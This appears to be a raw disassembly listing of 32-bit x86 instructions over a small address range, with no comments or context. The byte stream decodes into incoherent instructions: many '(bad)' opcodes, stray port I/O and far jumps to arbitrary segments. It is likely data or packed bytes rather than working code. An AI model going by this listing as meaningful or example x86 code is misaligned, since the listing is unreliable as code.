  408a06:	xchg   edx,eax
  408a07:	and    edi,DWORD PTR [edi]
  408a09:	repnz inc esi
  408a0b:	sbb    BYTE PTR [eax+0x21d63e18],al
  408a11:	pop    es
  408a12:	or     dh,BYTE PTR [esi-0x38e7b22a]
  408a18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a19:	mov    edx,DWORD PTR [eax-0x7]
  408a1c:	sbb    DWORD PTR [ecx],ecx
  408a1e:	dec    edx
  408a1f:	mov    edx,0x468fe0d3
  408a24:	imul   ebp,ebp,0xe6213a55
  408a2a:	dec    ecx
  408a2b:	jo     0x408a37
  408a2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a2e:	test   al,0x37
  408a30:	pop    edx
  408a31:	test   DWORD PTR [ebx],esi
  408a33:	inc    eax
  408a34:	inc    esi
  408a35:	ror    BYTE PTR [esi+0x1ec27715],0x77
  408a3c:	xchg   ecx,eax
  408a3d:	ds xchg ecx,eax
  408a3f:	and    BYTE PTR [esi+0x824d35d],bl
  408a45:	mov    ds:0xfe8c6447,al
  408a4a:	mov    cl,0xf5
  408a4c:	add    dl,BYTE PTR [ecx+0x792bce84]
  408a52:	xlat   BYTE PTR ds:[ebx]
  408a53:	mov    ebp,0xcdbcd6c7
  408a58:	dec    esi
  408a59:	fwait
  408a5a:	in     eax,dx
  408a5b:	rol    BYTE PTR [ebp-0x4d],cl
  408a5e:	or     eax,0xbc6ebc40
  408a63:	nop
  408a64:	and    al,0xf6
  408a66:	into   
  408a67:	fmul   QWORD PTR [edx+0x43f510f1]
  408a6d:	shr    DWORD PTR [ebp-0x3eb5b488],cl
  408a73:	fdiv   QWORD PTR [esi-0x41]
  408a76:	lods   eax,DWORD PTR ds:[esi]
  408a77:	mov    edx,DWORD PTR [eax+0x15]
  408a7a:	mov    bl,0x5b
  408a7c:	xchg   ebx,eax
  408a7d:	lods   al,BYTE PTR ds:[esi]
  408a7e:	lods   eax,DWORD PTR ds:[esi]
  408a7f:	in     al,dx
  408a80:	mov    BYTE PTR ds:0xaf27f100,0x95
  408a87:	(bad)  
  408a88:	jmp    0x8180:0xcf145231
  408a8f:	lea    esp,[edi-0x2002b59]
  408a95:	pop    ebp
  408a96:	sbb    al,0xd5
  408a98:	in     eax,0xab
  408a9a:	out    0x4a,al
  408a9c:	dec    eax
  408a9d:	test   al,0xcb
  408a9f:	xor    bl,BYTE PTR [edx-0x4d291124]
  408aa5:	push   ss
  408aa6:	(bad)  
  408aa7:	fcmovne st,st(0)
  408aa9:	cs aas 
  408aab:	(bad)  
  408aac:	es cld 
  408aae:	pop    ebp
  408aaf:	std    
  408ab0:	(bad)  
  408ab1:	bnd call 0xcf940025
  408ab7:	add    al,0x6d
  408ab9:	daa    
  408aba:	dec    edx
  408abb:	mov    al,ds:0x59ede60e
  408ac0:	pop    edx
  408ac1:	or     eax,0x347ddeb2
  408ac6:	jmp    0xa228ba6b
  408acb:	(bad)  
  408acf:	cmpxchg BYTE PTR [ebp-0x6b39e378],dh
  408ad6:	mov    ecx,0x51065f1f
  408adb:	pop    ebp
  408adc:	or     BYTE PTR [edx-0x2caa0d9b],bl
  408ae2:	mov    edx,0x9ce68597
  408ae7:	aam    0xa9
  408ae9:	xor    dh,al
  408aeb:	adc    edx,DWORD PTR [edx+0x36fffc8b]
  408af1:	cmp    esi,0xc0fb9a5
  408af7:	cwde   
  408af8:	mov    al,0x2
  408afa:	or     al,0x22
  408afc:	xor    BYTE PTR [edi],0x70
  408aff:	jae    0x408a88
  408b01:	jle    0x408b46
  408b03:	loop   0x408b36
  408b05:	dec    ecx
  408b06:	test   al,0x85
  408b08:	jmp    0x408b5d
  408b0a:	lock xor al,0x3e
  408b0d:	cs addr16 push cs
  408b10:	adc    BYTE PTR [ebp+0x388fe294],bh
  408b16:	(bad)  
  408b17:	jb     0x408ac3
  408b19:	mov    ebx,0x5d774ff0
  408b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b1f:	push   ss
  408b20:	mov    edx,0x77688433
  408b25:	cmc    
  408b26:	cld    
  408b27:	inc    edx
  408b28:	jo     0x408b25
  408b2a:	jo     0x408ac3
  408b2c:	push   ecx
  408b2d:	xor    DWORD PTR [edx+0x49],esp
  408b30:	fist   DWORD PTR [eax+0x7d]
  408b33:	scas   al,BYTE PTR es:[edi]
  408b34:	xor    al,0x6b
  408b36:	test   BYTE PTR [ebp-0x77ec9ee9],al
  408b3c:	and    ah,BYTE PTR [ecx+0x708440fb]
  408b42:	enter  0x39b6,0x2f
  408b46:	cld    
  408b47:	inc    eax
  408b48:	daa    
  408b49:	xor    ebx,edi
  408b4b:	ins    BYTE PTR es:[edi],dx
  408b4c:	mov    eax,ds:0x192e93f5
  408b51:	xchg   BYTE PTR [ecx-0x38348e8d],bl
  408b57:	jle    0x3605216b
  408b5d:	add    al,0x91
  408b5f:	pop    ebx
  408b60:	fisubr WORD PTR [edi+ebp*1]
  408b63:	retf   0x9fef
  408b66:	(bad)  
  408b67:	dec    esi
  408b68:	mov    dl,0xb3
  408b6a:	popf   
  408b6b:	mov    esp,0x925ebf0
  408b70:	rol    BYTE PTR ds:[esi+0x2a],1
  408b74:	jno    0x408b78
  408b76:	add    dl,BYTE PTR [edi-0x80]
  408b79:	test   DWORD PTR [edx-0x348257d7],esi
  408b7f:	cwde   
  408b80:	loop   0x408b60
  408b82:	imul   ebp,DWORD PTR [edx],0x57
  408b85:	pop    esp
  408b86:	mov    bl,ch
  408b88:	jb     0x408b2b
  408b8a:	mov    edi,0x344b1394
  408b8f:	inc    esi
  408b90:	mov    edi,0x28e375f7
  408b95:	int3   
  408b96:	popa   
  408b97:	adc    DWORD PTR [eax],0xb53ed8c9
  408b9d:	adc    ebp,esp
  408b9f:	dec    ecx
  408ba0:	daa    
  408ba1:	push   es
  408ba2:	jmp    0x408b31
  408ba4:	pop    es
  408ba5:	jbe    0x408c12
  408ba7:	je     0x408b65
  408ba9:	or     al,0x37
  408bab:	sbb    al,0x7a
  408bad:	sub    BYTE PTR [eax],cl
  408baf:	inc    ecx
  408bb0:	dec    esi
  408bb1:	shl    DWORD PTR ds:0x876914b1,0xb3
  408bb8:	mov    al,0xdf
  408bba:	dec    esi
  408bbb:	stos   DWORD PTR es:[edi],eax
  408bbc:	dec    esp
  408bbd:	aad    0xa0
  408bbf:	mov    dh,0x86
  408bc1:	pop    es
  408bc2:	mov    al,ds:0xfedef2c6
  408bc7:	jmp    0x5860:0xdfcc7d87
  408bce:	neg    BYTE PTR [esi+0x4e9ab141]
  408bd4:	data16 or ch,ch
  408bd7:	cwde   
  408bd8:	xor    eax,0x46bce18e
  408bdd:	sete   BYTE PTR [ecx+0x60113339]
  408be4:	test   BYTE PTR [ecx-0x2],dh
  408be7:	or     eax,0xfc54af71
  408bec:	or     eax,0x6856d37f
  408bf1:	mov    bl,dh
  408bf3:	jecxz  0x408b84
  408bf5:	mov    ebp,0x32f41cfd
  408bfa:	retf   0x4455
  408bfd:	in     al,dx
  408bfe:	jo     0x408c62
  408c00:	jbe    0x408c60
  408c02:	imul   edi,ebp,0x3d
  408c05:	dec    ebp
  408c06:	jb     0x408c32
  408c08:	sub    eax,eax
  408c0a:	mov    bh,0x63
  408c0c:	jns    0x408bdb
  408c0e:	jo     0x408ba7
  408c10:	sti    
  408c11:	mov    dh,0xa3
  408c13:	das    
  408c14:	mov    dh,0x41
  408c16:	or     DWORD PTR [edx+ecx*1-0x6eb84b92],edx
  408c1d:	test   eax,0x6446ff8f
  408c22:	rcl    BYTE PTR [edx-0x5c],0xa6
  408c26:	lds    edi,FWORD PTR [edx+esi*4]
  408c29:	aas    
  408c2a:	aaa    
  408c2b:	jne    0x408bfe
  408c2d:	int3   
  408c2e:	jg     0x408c19
  408c30:	mov    DWORD PTR [ebp+ebp*1-0x5e6c094b],esp
  408c37:	pop    es
  408c38:	cdq    
  408c39:	call   0x47e1:0xbf505a2c
  408c40:	pop    esp
  408c41:	aam    0x27
  408c43:	or     al,cl
  408c45:	mul    cl
  408c47:	pop    ss
  408c48:	jmp    0x408c0a
  408c4a:	and    al,0x12
  408c4c:	mov    BYTE PTR [ecx+0x2a],al
  408c4f:	mov    ch,0xda
  408c51:	arpl   WORD PTR [esi+0xd3fdde1],bp
  408c57:	or     bl,bh
  408c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c5a:	pop    esp
  408c5b:	add    ebx,ecx
  408c5d:	inc    edi
  408c5e:	cmp    cl,dl
  408c60:	push   esp
  408c61:	sub    edx,esi
  408c63:	jno    0x408cbd
  408c65:	sub    eax,0x8d4e2f33
  408c6a:	(bad)  
  408c6b:	jns    0x408c13
  408c6d:	xchg   edx,eax
  408c6e:	cld    
  408c6f:	scas   eax,DWORD PTR es:[edi]
  408c70:	mov    BYTE PTR [esp+ecx*8+0x19],dl
  408c74:	xchg   ebp,eax
  408c75:	xchg   ecx,eax
  408c76:	xor    eax,0x899beb36
  408c7b:	add    BYTE PTR [esi],bh
  408c7d:	jbe    0x408ccc
  408c7f:	push   DWORD PTR [ebx+0x1341e04e]
  408c85:	or     al,0xfe
  408c87:	dec    edx
  408c88:	mov    esp,0x28919bdd
  408c8d:	sub    esp,ebp
  408c8f:	and    ah,BYTE PTR [eax-0x5c]
  408c92:	sub    eax,0xd738bac
  408c97:	(bad)  
  408c98:	pop    ebp
  408c99:	lea    esp,[eax]
  408c9b:	lock xchg BYTE PTR [eax+ebx*1-0x1b],dl
  408ca0:	push   esi
  408ca1:	sbb    DWORD PTR [edx-0x3a],0x30
  408ca5:	xor    BYTE PTR [eax+0x54],al
  408ca8:	ret    
  408ca9:	jne    0x408c3e
  408cab:	imul   ebp,DWORD PTR [edi+0x3f8de9a5],0x6d
  408cb2:	sbb    BYTE PTR [edx+edx*4+0x5c2226ff],cl
  408cb9:	stc    
  408cba:	cmp    ah,BYTE PTR [edx+0x5]
  408cbd:	mov    edx,0xf0898a3e
  408cc2:	fstp   TBYTE PTR ss:[eax]
  408cc5:	adc    eax,0x730ef332
  408cca:	fidiv  WORD PTR [ecx-0x164137e9]
  408cd0:	pop    esi
  408cd1:	in     eax,0x36
  408cd3:	xchg   edi,eax
  408cd4:	(bad)  
  408cd5:	(bad)  
  408cd7:	lahf   
  408cd8:	cmp    DWORD PTR es:[esi-0x63],edi
  408cdc:	arpl   ax,dx
  408cde:	ss call 0x81ba:0xde37bf30
  408ce6:	bnd jo 0x408c74
  408ce9:	ror    DWORD PTR [edi+0x6a737e3f],cl
  408cef:	in     eax,0x98
  408cf1:	xlat   BYTE PTR ds:[ebx]
  408cf2:	mov    cl,0xf4
  408cf4:	pop    ss
  408cf5:	dec    esi
  408cf6:	iret   
  408cf7:	scas   al,BYTE PTR es:[edi]
  408cf8:	cwde   
  408cf9:	add    dl,BYTE PTR [eax+0x52]
  408cfc:	cmp    dl,BYTE PTR [ebp+0xd]
  408cff:	lods   al,BYTE PTR ds:[esi]
  408d00:	sub    DWORD PTR [ecx+0x68535903],ebp
  408d06:	stc    
  408d07:	xor    ch,cl
  408d09:	jne    0x408c90
  408d0b:	inc    eax
  408d0c:	cdq    
  408d0d:	sahf   
  408d0e:	sub    DWORD PTR [edi],edi
  408d10:	imul   ecx,esp,0x21
  408d13:	jmp    0x14e0018d
  408d18:	cmp    bh,cl
  408d1a:	mov    esi,0x740d1242
  408d1f:	mov    al,ds:0xecb3b1c7
  408d24:	dec    ecx
  408d25:	push   es
  408d26:	mov    dl,0x3f
  408d28:	or     al,0x10
  408d2a:	dec    edi
  408d2b:	arpl   WORD PTR [edx+0x52d5e693],bx
  408d31:	xchg   edi,eax
  408d32:	add    cl,ah
  408d34:	dec    ecx
  408d35:	je     0x408d38
  408d37:	nop
  408d38:	addr16 enter 0x8455,0x4a
  408d3d:	jno    0x408d6d
  408d3f:	mov    ebp,0xcffe2a85
  408d44:	adc    BYTE PTR [edi],bh
  408d46:	and    eax,DWORD PTR [ecx-0x6d]
  408d49:	and    dl,al
  408d4b:	popf   
  408d4c:	sbb    BYTE PTR es:[edx],ah
  408d4f:	js     0x408d39
  408d51:	inc    ebp
  408d52:	jno    0x408d59
  408d54:	lea    eax,[eax-0x7961ccf2]
  408d5a:	inc    edi
  408d5b:	adc    BYTE PTR [ebx+eax*8-0x74],0x93
  408d60:	mov    eax,ds:0xe998e787
  408d65:	mov    eax,0xbafeecd6
  408d6a:	cld    
  408d6b:	repnz int3 
  408d6d:	in     al,0x96
  408d6f:	add    ah,dl
  408d71:	mov    ecx,0x85abd772
  408d77:	out    0x4,eax
  408d79:	push   esi
  408d7a:	xchg   edx,eax
  408d7b:	test   BYTE PTR [edx+0x5db9a6ed],0x86
  408d82:	int    0xaa
  408d84:	mov    ebx,0xc8dddb19
  408d89:	call   0x47ea:0x90fe8e0d
  408d90:	mov    eax,0xf50ab687
  408d95:	shl    DWORD PTR ss:[ecx+0x2e],1
  408d99:	push   esi
  408d9a:	jmp    0x71ad4b05
  408d9f:	mov    ebp,0x2481438
  408da4:	aas    
  408da5:	je     0x408d45
  408da7:	scas   eax,DWORD PTR es:[edi]
  408da8:	push   eax
  408da9:	lods   al,BYTE PTR ds:[esi]
  408daa:	mov    al,ds:0xc19a7646
  408daf:	ss push ds
  408db1:	adc    edi,DWORD PTR [esi]
  408db3:	pusha  
  408db4:	dec    esp
  408db5:	xchg   ebx,eax
  408db6:	push   0x49
  408db8:	ins    DWORD PTR es:[edi],dx
  408db9:	xlat   BYTE PTR ds:[ebx]
  408dba:	aas    
  408dbb:	jbe    0x408d74
  408dbd:	and    eax,0xfc0aece2
  408dc2:	dec    eax
  408dc3:	push   ebx
  408dc4:	cmc    
  408dc5:	cmp    bh,BYTE PTR [eax-0x3]
  408dc8:	inc    esp
  408dc9:	mov    edx,0x620cc0ec
  408dce:	inc    esp
  408dcf:	enter  0x7c0d,0x2a
  408dd3:	shl    BYTE PTR [esp+ecx*8+0x6f],1
  408dd7:	popf   
  408dd8:	cs pop ebx
  408dda:	mov    eax,ds:0x529aaadf
  408ddf:	pop    ecx
  408de0:	sub    ecx,DWORD PTR [ebx+0x4b401dc4]
  408de6:	xchg   edi,eax
  408de7:	scas   eax,DWORD PTR es:[edi]
  408de8:	pop    es
  408de9:	xchg   esi,eax
  408dea:	jmp    0x408e26
  408dec:	inc    esp
  408ded:	into   
  408dee:	in     eax,0x4f
  408df0:	xchg   DWORD PTR [ecx+eax*4-0x355eec04],ecx
  408df7:	add    esi,DWORD PTR [eax+0x33]
  408dfa:	jmp    0x16e8:0x26cb3c3d
  408e01:	jae    0x408da1
  408e03:	int    0x1f
  408e05:	cmp    edx,DWORD PTR ds:0x28d43380
  408e0b:	mov    ds:0x7ae30ce3,al
  408e10:	outs   dx,BYTE PTR ds:[esi]
  408e11:	xchg   eax,esp
  408e13:	fidivr DWORD PTR [edx]
  408e15:	dec    edx
  408e16:	cdq    
  408e17:	or     DWORD PTR [ebx],edx
  408e19:	push   ds
  408e1a:	bound  ecx,QWORD PTR [edi]
  408e1c:	sti    
  408e1d:	fwait
  408e1e:	test   ebx,ebx
  408e20:	pop    esi
  408e21:	add    edx,DWORD PTR [eax+ebp*1-0x3ed0b101]
  408e28:	enter  0xd2bd,0x59
  408e2c:	retf   
  408e2d:	call   0x4476:0x3bb2acf9
  408e34:	xchg   ebx,edi
  408e36:	stos   DWORD PTR es:[edi],eax
  408e37:	inc    ebx
  408e38:	iret   
  408e39:	fdivr  DWORD PTR [edx-0x66]
  408e3c:	mov    es,WORD PTR [edi-0x52]
  408e3f:	sbb    ah,BYTE PTR [ebx]
  408e41:	cmp    BYTE PTR [edi*4+0x5d661019],dl
  408e48:	inc    ecx
  408e49:	sub    eax,0x561deb0
  408e4e:	pop    es
  408e4f:	and    BYTE PTR [ecx+ebp*4],0x89
  408e53:	inc    edi
  408e54:	xor    eax,0x907b5701
  408e59:	fadd   st,st(7)
  408e5b:	mov    WORD PTR ds:0x899a9640,cs
  408e61:	pop    ds
  408e62:	loopne 0x408e81
  408e64:	test   eax,0x87f5bfaa
  408e69:	out    0x38,al
  408e6b:	cdq    
  408e6c:	inc    ebx
  408e6d:	mov    ds:0x6a62be13,al
  408e72:	mov    ch,0x17
  408e74:	fidivr WORD PTR [esi-0x2b24f1a3]
  408e7a:	xchg   ebp,eax
  408e7b:	arpl   WORD PTR [edi+0xb71c1e0],ax
  408e81:	lds    edi,FWORD PTR [edx]
  408e83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e84:	dec    ebx
  408e85:	push   esp
  408e86:	int    0x92
  408e88:	pop    ds
  408e89:	add    bh,BYTE PTR [edi]
  408e8b:	loope  0x408e56
  408e8d:	sbb    BYTE PTR [ebp+0x5247d940],dl
  408e93:	mov    ch,0x3a
  408e95:	mov    ch,0x45
  408e97:	xchg   ebp,eax
  408e98:	mov    WORD PTR [eax],fs
  408e9a:	mov    eax,0x175a6084
  408e9f:	pop    edi
  408ea0:	push   ecx
  408ea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ea2:	das    
  408ea3:	or     al,0x8a
  408ea5:	adc    DWORD PTR [ebp+0x6a],ecx
  408ea8:	mov    bl,0x84
  408eaa:	cmp    DWORD PTR [edx],edx
  408eac:	add    DWORD PTR [eax],edi
  408eae:	xlat   BYTE PTR ds:[ebx]
  408eaf:	bound  edx,QWORD PTR [ebp+eax*1+0x74c47fa5]
  408eb6:	int3   
  408eb7:	sbb    BYTE PTR [ecx+0x14],bh
  408eba:	sbb    esp,DWORD PTR [ecx]
  408ebc:	push   eax
  408ebd:	adc    al,0x95
  408ebf:	ss inc esp
  408ec1:	jae    0x408e83
  408ec3:	imul   esp,DWORD PTR [esi+0x534aa585],0x74
  408eca:	jle    0x408f05
  408ecc:	xor    cl,BYTE PTR [ebx-0x4b29d299]
  408ed2:	mov    edx,0xa7cf8b46
  408ed7:	mov    dl,0xc9
  408ed9:	mov    dh,0x38
  408edb:	lods   eax,DWORD PTR ds:[esi]
  408edc:	out    0x81,al
  408ede:	jb     0x408f5f
  408ee0:	mov    esi,0x63a2721f
  408ee5:	inc    esi
  408ee6:	xchg   DWORD PTR [eax-0x5e],eax
  408ee9:	mov    ch,0x5e
  408eeb:	jge    0x408f24
  408eed:	jne    0x408ebd
  408eef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ef0:	xor    bl,cl
  408ef2:	inc    edx
  408ef3:	push   cs
  408ef4:	inc    ebx
  408ef5:	clc    
  408ef6:	inc    edi
  408ef7:	clc    
  408ef8:	je     0x408f32
  408efa:	pop    eax
  408efb:	dec    ecx
  408efc:	js     0x408f0f
  408efe:	xor    bl,BYTE PTR [esi]
  408f00:	loop   0x408f7a
  408f02:	xchg   edi,eax
  408f03:	int    0x6e
  408f05:	(bad)  
  408f07:	sbb    eax,0x6b4e3e72
  408f0c:	lods   al,BYTE PTR ds:[esi]
  408f0d:	popa   
  408f0e:	ins    BYTE PTR es:[edi],dx
  408f0f:	(bad)  
  408f10:	adc    eax,0xc133f6d1
  408f15:	jg     0x408f49
  408f17:	or     edi,ecx
  408f19:	dec    ebp
  408f1a:	aaa    
  408f1b:	push   ss
  408f1c:	into   
  408f1d:	sbb    DWORD PTR [ebx],eax
  408f1f:	mov    dh,0x91
  408f21:	cmp    bh,BYTE PTR [edx+0xfb3ee14]
  408f27:	lea    esi,[eax-0x219f81bd]
  408f2d:	fidivr WORD PTR [edx]
  408f2f:	outs   dx,DWORD PTR ds:[esi]
  408f30:	sbb    al,0x24
  408f32:	aad    0x24
  408f34:	sub    edi,DWORD PTR [ecx-0x327f9f2e]
  408f3a:	int    0x83
  408f3c:	(bad)  
  408f3d:	call   0x375b3304
  408f42:	mov    gs,edi
  408f44:	xor    DWORD PTR [ecx-0x16],esp
  408f47:	mov    dl,0x7a
  408f49:	(bad)  
  408f4a:	cmc    
  408f4b:	inc    ebp
  408f4c:	mov    DWORD PTR [ecx],edx
  408f4e:	mov    eax,ds:0x59ed62fe
  408f53:	int3   
  408f54:	in     eax,0xd6
  408f56:	not    DWORD PTR [ecx+0x5e]
  408f59:	mov    bh,0xa1
  408f5b:	and    cl,BYTE PTR [edi-0x40]
  408f5e:	es and ah,al
  408f61:	ret    
  408f62:	test   eax,0x3ade5ebe
  408f67:	int3   
  408f68:	daa    
  408f69:	mov    BYTE PTR [edi-0x3f],ah
  408f6c:	ins    BYTE PTR es:[edi],dx
  408f6d:	es pop esp
  408f6f:	int    0xcb
  408f71:	ror    cl,cl
  408f73:	adc    BYTE PTR [ebx-0x54a2534d],ch
  408f79:	ins    BYTE PTR es:[edi],dx
  408f7a:	mov    ebp,0x249f02be
  408f7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f80:	data16 mov bl,0x75
  408f83:	adc    eax,0xebebe8a1
  408f88:	mov    bl,0x10
  408f8a:	addr16 jbe 0x408f10
  408f8d:	ficomp WORD PTR [edi+0x25104a2]
  408f93:	inc    esp
  408f94:	mov    bl,0x7a
  408f96:	ss push 0x5a
  408f99:	push   0xfffffffe
  408f9b:	inc    ebx
  408f9c:	add    bl,bh
  408f9e:	ror    BYTE PTR [ebx+esi*8-0x3dcb96f6],1
  408fa5:	adc    DWORD PTR [edx+ebp*1+0x4d],esi
  408fa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408faa:	sahf   
  408fab:	sbb    esi,edi
  408fad:	addr16 rcr bl,cl
  408fb0:	(bad)  
  408fb1:	jmp    0x74990195
  408fb6:	aam    0xde
  408fb8:	(bad)  
  408fb9:	clc    
  408fba:	jne    0x408f3f
  408fbc:	in     al,0x41
  408fbe:	pusha  
  408fbf:	dec    esi
  408fc0:	mov    eax,0x92842ef6
  408fc5:	jmp    0x7c1f:0x6f97
  408fcb:	xor    DWORD PTR [eax],esp
  408fcd:	pop    ss
  408fce:	call   0xaca6:0x438b6a11
  408fd5:	jle    0x409055
  408fd7:	shr    DWORD PTR [eax+0x2a],1
  408fda:	call   0xd990:0xc9949f9c
  408fe1:	sbb    ecx,edi
  408fe3:	xchg   DWORD PTR [esp+edi*2-0x3d35a9b7],ecx
  408fea:	add    BYTE PTR [edx-0x1acc95df],ch
  408ff0:	sub    bh,BYTE PTR [esi-0x33]
  408ff3:	mov    eax,ds:0x3f526b16
  408ff8:	jmp    0xe2d6953c
  408ffd:	pusha  
  408ffe:	retf   0xac16
  409001:	and    DWORD PTR [edx+0x60],ecx
  409004:	or     BYTE PTR [ecx-0x2a],dl
  409007:	stc    
  409008:	cld    
  409009:	xor    edx,DWORD PTR [edx+0x64]
  40900c:	nop
  40900d:	jg     0x408fcd
  40900f:	mov    fs,WORD PTR [ebp-0x76]
  409012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409013:	shr    DWORD PTR [esi+0x44],cl
  409016:	mov    dl,BYTE PTR [ebx-0x19385e88]
  40901c:	hlt    
  40901d:	mov    edi,0xe11fcbdd
  409022:	cwde   
  409023:	mov    bh,0x81
  409025:	sub    bl,BYTE PTR [eax+0x44b59ee]
  40902b:	jmp    0x942c:0xb3d4d7a1
  409032:	icebp  
  409033:	into   
  409034:	test   BYTE PTR [edx-0x13],ch
  409037:	sub    ch,al
  409039:	test   DWORD PTR [ebx],ebx
  40903b:	pop    ds
  40903c:	adc    esp,DWORD PTR [edi+0x5e]
  40903f:	stc    
  409040:	nop
  409041:	mov    eax,ds:0xe125feb3
  409046:	push   esp
  409047:	push   esp
  409048:	outs   dx,BYTE PTR ds:[esi]
  409049:	xor    dl,ch
  40904b:	push   esp
  40904c:	test   BYTE PTR [eax+0x70cd3275],0x45
  409053:	imul   ebx,DWORD PTR [ecx+eiz*8-0x37b0d40d],0x78
  40905b:	rol    edi,1
  40905d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40905e:	push   ds
  40905f:	sub    al,0xf3
  409061:	xor    eax,0xa975d236
  409066:	repz sbb al,0x96
  409069:	iret   
  40906a:	cli    
  40906b:	cmp    ebx,DWORD PTR [esi-0x47d24d91]
  409071:	sti    
  409072:	dec    ebp
  409074:	push   esi
  409075:	out    dx,al
  409076:	xchg   DWORD PTR [ebp-0x61],ebx
  409079:	fwait
  40907a:	retf   0xc995
  40907d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40907e:	mov    dl,0x39
  409080:	mov    ebx,0x2d365e84
  409085:	mov    bh,BYTE PTR [ecx]
  409087:	outs   dx,DWORD PTR ds:[esi]
  409088:	into   
  409089:	sbb    DWORD PTR [ecx],ebx
  40908b:	dec    eax
  40908c:	adc    DWORD PTR [edx],edx
  40908e:	fiadd  WORD PTR [edi+0x5fdee47]
  409094:	cmp    eax,0xd1bfcdc3
  409099:	jecxz  0x4090c8
  40909b:	test   al,0xb8
  40909d:	inc    ecx
  40909e:	add    DWORD PTR [ecx+0x60],0x2
  4090a2:	rcl    BYTE PTR [ecx],1
  4090a4:	add    eax,0x35b0f946
  4090a9:	fld    QWORD PTR [ebx]
  4090ab:	test   al,0x76
  4090ad:	pop    edi
  4090ae:	push   ds
  4090af:	push   edi
  4090b0:	inc    edx
  4090b1:	in     al,0xf7
  4090b3:	cwde   
  4090b4:	gs dec ecx
  4090b6:	mov    ds:0x2e0585ec,al
  4090bb:	adc    al,0x4f
  4090bd:	shl    DWORD PTR [esi-0x38],1
  4090c0:	sbb    esi,DWORD PTR [ebx-0x4e]
  4090c3:	sub    BYTE PTR [eax+0x522f6a75],dh
  4090c9:	sbb    bh,al
  4090cb:	dec    esp
  4090cc:	rcr    BYTE PTR [edx-0x8abd6be],cl
  4090d2:	repnz data16 stos BYTE PTR es:[edi],al
  4090d5:	gs into 
  4090d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090d8:	jbe    0x40909e
  4090da:	xor    eax,0x711a9c6b
  4090df:	and    al,0xa9
  4090e1:	cwde   
  4090e2:	clc    
  4090e3:	icebp  
  4090e4:	in     eax,0x6e
  4090e6:	push   eax
  4090e7:	push   esp
  4090e8:	fwait
  4090e9:	pushf  
  4090ea:	sub    ah,BYTE PTR [esi]
  4090ec:	mov    bl,0xc
  4090ee:	gs aad 0xfe
  4090f1:	in     eax,dx
  4090f2:	(bad)  
  4090f3:	popf   
  4090f4:	loop   0x4090f0
  4090f6:	push   ebp
  4090f7:	or     al,0xfd
  4090f9:	cmp    esp,DWORD PTR [ecx+0x62]
  4090fc:	cs inc eax
  4090fe:	mov    ebp,0x67e13ca6
  409103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409104:	fcomp  QWORD PTR [ebx-0x190c871a]
  40910a:	icebp  
  40910b:	inc    esi
  40910c:	mov    WORD PTR [ebx+0x1d86582d],?
  409112:	push   cs
  409113:	dec    edi
  409114:	loopne 0x4090e0
  409116:	ss mov bl,0xcd
  409119:	div    BYTE PTR es:[edi]
  40911c:	sbb    bl,BYTE PTR [esi+ebp*2-0x2a2bf3ab]
  409123:	xchg   esp,eax
  409124:	scas   al,BYTE PTR es:[edi]
  409125:	push   esi
  409126:	dec    ecx
  409127:	mov    al,ds:0xff0b68dc
  40912c:	outs   dx,DWORD PTR ds:[esi]
  40912d:	xchg   BYTE PTR ds:0xb617b2ea,al
  409133:	jl     0x409143
  409135:	icebp  
  409136:	rol    DWORD PTR [ebx],0xe4
  409139:	jo     0x40913d
  40913b:	dec    ecx
  40913c:	or     al,0xd
  40913e:	out    0x58,al
  409140:	mov    esp,esi
  409142:	cli    
  409143:	enter  0x17db,0x29
  409147:	xor    BYTE PTR [ecx+0x13],bh
  40914a:	cmp    DWORD PTR [edi+ebx*1-0x555a7fb6],0xfffffffb
  409152:	idiv   DWORD PTR [ecx-0x5f6ed713]
  409158:	sar    ecx,0x34
  40915b:	ret    
  40915c:	jno    0x4090ea
  40915e:	ret    0xa6c4
  409161:	cs dec ecx
  409163:	ret    0xacfe
  409166:	mov    ah,0x64
  409168:	cmc    
  409169:	xchg   edx,eax
  40916a:	hlt    
  40916b:	fadd   QWORD PTR [edx+0x54]
  40916e:	retf   0xcf89
  409171:	jb     0x409120
  409173:	push   0x22
  409175:	cmp    edx,ecx
  409177:	in     eax,0x53
  409179:	cwde   
  40917a:	push   ds
  40917b:	jb     0x4091e3
  40917d:	xchg   edi,eax
  40917e:	xor    dh,BYTE PTR [ebp+0x53]
  409181:	mov    esi,0x5a758505
  409186:	dec    edi
  409187:	add    eax,0x7ebb0cec
  40918c:	jae    0x409161
  40918e:	and    ah,0x31
  409191:	je     0x40914c
  409193:	and    al,0x86
  409195:	fdivr  DWORD PTR [ecx]
  409197:	push   cs
  409198:	addr16 mov ds:0xf2de,al
  40919c:	aas    
  40919d:	dec    ebp
  40919e:	cmp    eax,0xe45a0c21
  4091a3:	test   eax,0x383abadd
  4091a8:	sti    
  4091a9:	out    dx,eax
  4091aa:	lds    edi,FWORD PTR [edx-0x53901123]
  4091b0:	aas    
  4091b1:	and    eax,0x10dd3031
  4091b6:	fwait
  4091b7:	inc    esp
  4091b8:	inc    eax
  4091b9:	(bad)  
  4091ba:	or     BYTE PTR [edi+0x50],ch
  4091bd:	retf   0xb19b
  4091c0:	gs jmp 0x8f9e5fec
  4091c6:	and    eax,0xc9d1409c
  4091cb:	div    BYTE PTR [edi-0x49]
  4091ce:	push   es
  4091cf:	in     al,dx
  4091d0:	retf   
  4091d1:	rcr    DWORD PTR [ecx-0xc],1
  4091d4:	cli    
  4091d5:	push   ebp
  4091d6:	mov    esi,0x133a2abe
  4091db:	ret    
  4091dc:	retf   
  4091dd:	inc    esi
  4091de:	dec    edi
  4091df:	call   0xa96811ab
  4091e4:	lahf   
  4091e5:	jmp    0xef2a:0xc0d65f07
  4091ec:	scas   eax,DWORD PTR es:[edi]
